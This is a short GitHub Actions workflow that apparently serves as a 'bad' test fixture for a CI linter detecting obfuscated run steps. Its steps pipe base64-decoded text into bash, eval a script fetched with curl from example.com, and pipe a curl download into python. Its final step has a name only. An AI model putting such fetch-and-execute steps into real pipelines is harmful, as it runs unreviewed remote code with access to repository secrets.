name: obfuscated-run-bad
on: [push]

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: base64-decode-pipe-shell
        run: echo "aGVsbG8=" | base64 -d | bash

      - name: eval-curl
        run: eval $(curl https://example.com/script.sh)

      - name: curl-pipe-python
        run: curl https://example.com/setup.py | python

      - name: long-base64-literal
